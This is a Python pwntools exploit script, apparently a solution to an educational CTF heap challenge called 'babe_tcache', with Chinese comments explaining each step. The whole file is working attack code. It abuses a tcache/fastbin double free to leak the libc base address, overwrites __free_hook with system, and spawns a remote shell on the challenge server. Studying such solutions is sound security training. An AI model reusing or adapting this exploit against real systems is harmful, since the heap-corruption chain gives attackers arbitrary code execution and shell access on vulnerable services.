from pwn import *

context.log_level = 'debug'
#p = process("./babe_tcache")
p=remote("edu-ctf.zoolab.org",7122)
libc = ELF("./libc-2.27.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#one_gadget = 0x4f2c5 
#one_gadget = 0x10a38c
#one_gadget = 0x4f322  #one_gadget 无法使用
one_gadget = 0x4f440 #_libc_system地址
def new(idx,size,content):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("Index (0~1): ")
    p.sendline(str(idx))
    p.recvuntil("Size (1~128): ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)
def show(idx):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("Index (0~1): ")
    p.sendline(str(idx))
def free(idx):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Index (0~1): ")
    p.sendline(str(idx))
def new_10():
    for i in range(0,10):
        new(1,0x70,'a'*0x10+'\n')
def del_7():
    for i in range(0,7):
        free(1)

if __name__=='__main__':
    content = 'a'*0x10+'\n'
    new(0,0x70,content)
    new_10() #新建10个chunk
    del_7()  #删除，占满tcache
    free(0)  #tcache被占满，进入fastbin
    free(1)  #double free ，因为fastbin从presize开始的地址，进入tcache就可以对chunk 0的size进行修改
    new(1,0x70,p64(0)+'\n') 
    new(1,0x70,p64(0x0)+p64(0x481)+'\n') #伪造chunk 0的size

    free(0) #释放，得到unsorted bin
    new(0,0x20,'a'*8) #得到libc的地址，申请过程中地址会变，但偏移是固定的
    show(0) #泄露libc基址
    p.recvuntil('a'*8)
    libc_base = u64(p.recv(6).ljust(8,'\x00'))-96-0x410-0x10-libc.symbols['__malloc_hook']
    print "libc_base:",hex(libc_base)
    one_gadget = one_gadget + libc_base
    
    new(1,0x60,content)# double free
    free(1)
    free(1)

    new(1,0x60,p64(libc_base+0x3ed8e8)) #修改chunk 1的fd为__free_hook的地址

    #gdb.attach(p)
    new(1,0x60,content)
    new(1,0x60,p64(one_gadget))#在__free_hook的地址覆盖成_libc_system，执行free时就变成执行system
    new(0,0x60,'/bin/sh\0'+'\n')
    #之后free(0)，其实是执行了system("/bin/sh\0")
    p.interactive()
